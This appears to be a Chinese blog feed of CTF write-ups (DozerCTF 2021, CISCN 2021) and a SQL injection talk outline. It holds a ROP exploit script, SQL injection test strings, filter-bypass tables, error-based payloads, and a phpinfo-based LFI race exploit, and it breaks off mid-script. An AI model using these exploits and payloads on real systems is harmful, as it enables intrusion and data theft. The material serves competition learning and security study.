src="/article/dozerctf2021/image-20210530221918897.png" class="" title="image-20210530221918897" loading="lazy"><p>后面即使拿到了shell也没有进一步突破，扫ip还扫错了</p><img src="/article/dozerctf2021/image-20210530230130511.png" class="" title="image-20210530230130511" loading="lazy"><hr><h3 id="未完成的网站"><a href="#未完成的网站" class="headerlink" title="未完成的网站"></a>未完成的网站</h3><p>猜测点</p><p><code>./people/&#123;&#125;</code>和<code>./download?url=&#123;&#125;</code></p><p>试了下发现过滤了<code>[]</code></p><p>然后疯狂被域渗透折磨</p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5.30, 2021"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># p = process('./pwn')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'1.14.160.21'</span><span class="token punctuation">,</span><span class="token number">20001</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000401281</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401313</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000401311</span>bin_addr <span class="token operator">=</span> <span class="token number">0x000000000401199</span>sh_addr <span class="token operator">=</span> <span class="token number">0x0000000004011F9</span>sys_addr <span class="token operator">=</span> <span class="token number">0x000000000401176</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xB16BAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xBADF00D</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xFEE1DEAD</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>cat /flag</code>即可</p><img src="/article/dozerctf2021/image-20210530225342181.png" class="" title="image-20210530225342181" loading="lazy"><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><img src="/article/dozerctf2021/image-20210530222649894.png" class="" title="image-20210530222649894" loading="lazy"><p>手比较快</p><hr><h3 id="做个问卷吧"><a href="#做个问卷吧" class="headerlink" title="做个问卷吧"></a>做个问卷吧</h3><p>非常简单</p><hr><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><p>听说国赛有一个running_pixel?</p><p>那就类比一下，发现几张图片类似，看一下md5，发现一共只有6种md5。猜测是二进制，提出来前16章，二进制为</p><p><code>01000100</code>&#x3D;&#x3D;<code>d</code></p><p><code>01101111</code>&#x3D;&#x3D;<code>o</code></p><p>很明显思路正确，写脚本就行了</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5月 30, 2021"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_file_md5</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#创建md5对象</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fobj<span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment">#更新md5对象</span>    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#返回md5对象</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'5baa9d8a0912ddfbd29ac3786ef859f8'</span><span class="token punctuation">,</span><span class="token string">'d63f8a4a7a1d6c8b8f04e7d73797edf8'</span><span class="token punctuation">,</span><span class="token string">'6002507730ab969502579b66e9fda4b9'</span><span class="token punctuation">]</span>    list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'86f2fd64a8d1f6bfa0728be9e97a4a72'</span><span class="token punctuation">,</span><span class="token string">'000b14c847091094ae2777614f16f4c6'</span><span class="token punctuation">,</span><span class="token string">'4d8a4db35c3a27b36865750319f7cdfd'</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        time <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> list0<span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"0"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"1"</span>            time <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> time<span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">" "</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">".png"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> pic_file<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pic <span class="token operator">=</span> get_file_md5<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pic_file<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> pic    result <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> item<span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="/article/dozerctf2021/image-20210530223305341.png" class="" title="image-20210530223305341" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入分享</title>
      <link href="article/sqlinjection/"/>
      <url>article/sqlinjection/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>小交流会的提纲，记录下，没有逻辑可言</p><p>今年本人参加的CTF中记录的sql题目，由于可能有多种解，这里列出本人解法仅供参考</p><table><thead><tr><th>比赛-题目名称</th><th>注入类型</th><th>详细情况</th></tr></thead><tbody><tr><td>MTCTF-sql</td><td>盲注</td><td>布尔型，同表查询</td></tr><tr><td>国赛CISCN-easy_sql</td><td>盲注，报错</td><td>sqlmap一把梭，布尔型&#x2F;延时注入&#x2F;报错注入，最后无列名注入</td></tr><tr><td>红帽杯-WebsiteManger</td><td>盲注</td><td>布尔型(异或)&#x2F;延时注入</td></tr><tr><td>红明谷-happysql</td><td>盲注</td><td>布尔型(正则)，无列名注入</td></tr><tr><td>DASCTF三月赛-bestDB</td><td>联合注入</td><td>load_file()</td></tr><tr><td>V&amp;NCTF-realezjvav</td><td>盲注</td><td>延时注入(笛卡尔积)</td></tr><tr><td>HGAME-200OK!</td><td>联合注入</td><td>基础SQL注入</td></tr><tr><td>HGAME-Liki-Jail</td><td>盲注</td><td>延时注入</td></tr><tr><td>春秋杯新春欢乐赛-按F注入</td><td>联合注入</td><td>Pgsql，延时注入(也许)&#x2F;信息外带&#x2F;数据库外联</td></tr></tbody></table><p>打个广告，各比赛的WP，有需要的师傅可以看看</p><p><a href="https://err0r.top/article/cqb2021/">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><p><a href="https://err0r.top/article/VN2021ctf/">V&amp;N2021公开赛</a></p><p><a href="https://err0r.top/article/mardasctf/">SQL无列名注入</a></p><p><a href="https://err0r.top/article/redhat2021/">红帽杯2021</a></p><p><a href="https://err0r.top/article/ciscn2021/">2021CISCN-WP</a></p><p>统计了一下今年的SQL注入题目，可能不全，从上表能看出大部分都是盲注，盲注的重要性可想而知。</p><hr><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ol><p>最常用的一般是<code>database()</code>，有时候注意看<code>user()</code>，有些题目给的是root用户，需要用<code>load_file()</code>读文件，下面开始注入准备</p><hr><h2 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h2><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’&#x3D;’1</td><td>1’) or (‘1’&#x3D;’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’&#x3D;’2</td><td>value’) or (‘1’&#x3D;’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’&#x3D;’2</td><td>1’) and (‘1’&#x3D;’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’+’b</td><td>1’) or (‘ab’&#x3D;’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’ ‘b</td><td>1’) or (‘ab’&#x3D;’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’‖’b</td><td>1’) or (‘ab’&#x3D;’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><hr><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注，就是指执行sql语句后返回值不直接回显到前端页面</p><hr><h2 id="过滤情况"><a href="#过滤情况" class="headerlink" title="过滤情况"></a>过滤情况</h2><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>比较劲爆，如果有回显可以报错注入查出简单信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><code>user()</code>&#x2F;<code>database()</code>&#x2F;<code>version()</code></p><ul><li>但这不行，可以利用堆叠注入绕过过滤</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token comment">#</span></code></pre><p>然后利用预编译方式查数据</p><p>经典题目：<a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a></p><ul><li><p>或者<code>alter</code>改表名，然后万能密码登陆出结果(如果可回显的话)</p></li><li><p>据说web端过滤也许可以preg_match回溯限制(有的情况)</p></li><li><p>同表的话可以同表查询</p><p>盲注字段名利用<code>left(column,0)</code></p><p>当存在字段时返回True</p></li></ul><p>基本过滤</p><table><thead><tr><th align="center">过滤</th><th align="center">替代方法</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">&amp;</td></tr><tr><td align="center">or</td><td align="center">|</td></tr><tr><td align="center">[空格]</td><td align="center">&#x2F;**&#x2F;或()或%0a</td></tr><tr><td align="center">#</td><td align="center">–+</td></tr><tr><td align="center">substr()</td><td align="center">mid()、substring()</td></tr><tr><td align="center">ascii()</td><td align="center">hex()、bin()、ord()</td></tr><tr><td align="center">sleep()</td><td align="center">benchmark()</td></tr><tr><td align="center">group_concat()</td><td align="center">concat_ws()</td></tr><tr><td align="center">&lt;、&gt;</td><td align="center">greatest()</td></tr><tr><td align="center">limit n,m</td><td align="center">limit m offset n</td></tr></tbody></table><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’&#x3D;’1</td><td>1’) or (‘1’&#x3D;’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’&#x3D;’2</td><td>value’) or (‘1’&#x3D;’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’&#x3D;’2</td><td>1’) and (‘1’&#x3D;’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’+’b</td><td>1’) or (‘ab’&#x3D;’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’ ‘b</td><td>1’) or (‘ab’&#x3D;’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’‖’b</td><td>1’) or (‘ab’&#x3D;’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><h2 id="移位溢注"><a href="#移位溢注" class="headerlink" title="移位溢注"></a>移位溢注</h2><p>知道表名不需要知道字段名，一般没用，能用的时候都能用其他的注出来。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021CISCN-WP</title>
      <link href="article/ciscn2021/"/>
      <url>article/ciscn2021/</url>
      
        <content type="html"><![CDATA[<p>Ciscn 2021</p><p>队伍名称：S3C_2021</p><span id="more"></span><h2 id="队伍情况"><a href="#队伍情况" class="headerlink" title="队伍情况"></a>队伍情况</h2><p><del>本菜鸡太菜，不值一提，希望分区赛能冲刺，争取进入总决赛(删了)</del></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>sql注入，sqlmap跑</p><img src="/article/ciscn2021/image-20210515121550955.png" class="" title="image-20210515121550955" loading="lazy"><p>根据log得知库名security</p><img src="/article/ciscn2021/image-20210515121644530.png" class="" title="image-20210515121644530" loading="lazy"><p>表名users，flag</p><img src="/article/ciscn2021/image-20210515121704337.png" class="" title="image-20210515121704337" loading="lazy"><p>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>EXTRACTVALUE<span class="token punctuation">(</span><span class="token number">4078</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token number">0x717a7a7671</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token keyword">join</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token keyword">no</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6a7871</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>同表查询得到列名id,no,200e6beb-a706-473f-add2-29e877c6ce25</p><p>最终</p><img src="/article/ciscn2021/1.jpg" class="" title="2ED72E0CF8ED07FBCB27F11F73A6187B" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;63zs0-zMP27-bhZDu-kIEv3-AvlHh-&#125;</code></pre><hr><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>扫目录发现<code>.index.php.swo</code></p><p>可以利用 PHP 内置类中的 <code>ReflectionMethod</code> 来读取 <code>User</code> 类里面各个函数的注释</p><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</code></pre><img src="/article/ciscn2021/image-20210515124614970.png" class="" title="image-20210515124614970" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;Ak4Z6-6GU0a-fAz0n-OTdYy-KDq4Q-&#125;</code></pre><hr><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>扫目录发现<code>.listing</code></p><p>访问得到<code>you_can_seeeeeeee_me.php</code>，给了phpinfo</p><p>根据源码发现</p><p><code>$_POST[&quot;field&quot;];</code>和<code>echo $$field;</code>有出入</p><p>根据vulhub一个利用phpinfo进行文件包含的漏洞，改一下exp直接打</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> threading<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>    <span class="token comment"># PAYLOAD = """%s\r</span>    <span class="token comment"># &lt;?php var_dump(scandir('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/'));?>\r""" % TAG</span>    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r&lt;?php var_dump(file_get_contents('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g'));?>\r"""</span> <span class="token operator">%</span> TAG    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="123"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714"""</span> <span class="token operator">%</span> PAYLOAD    padding<span class="token operator">=</span><span class="token string">"G"</span> <span class="token operator">*</span> <span class="token number">5000</span>    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\rCookie: PHPSESSID=1; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\rHTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>    <span class="token comment">#modify this to suit the LFI script  </span>    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\rContent-Type: application/x-www-form-urlencodedContent-Length: %s\r\r%s"""</span>    <span class="token comment">#print(REQ1)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    fn<span class="token operator">=</span><span class="token string">"cf=../../../../../..&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span>    <span class="token comment">#print(fn)</span>    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>        <span class="token keyword">return</span> fncounter<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    